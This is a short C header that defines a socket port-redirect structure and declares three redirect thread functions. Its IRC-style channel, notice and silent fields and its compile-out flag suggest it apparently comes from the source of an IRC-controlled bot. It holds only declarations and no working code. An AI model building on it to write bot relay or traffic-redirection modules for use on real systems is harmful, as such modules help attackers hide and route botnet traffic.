#ifndef NO_REDIRECT
// redirect structure.
typedef struct REDIRECT 
{
	SOCKET sock;
	SOCKET csock;
	char dest[128];
	char chan[128];
	unsigned short port;
	unsigned short lport;
	int threadnum;
	int cthreadnum;
	bool notice;
	bool silent;
	bool gotinfo;
	bool cgotinfo;

} REDIRECT;

DWORD WINAPI RedirectThread(LPVOID param);
DWORD WINAPI RedirectLoopThread(LPVOID param);
DWORD WINAPI RedirectLoop2Thread(LPVOID param);
#endif
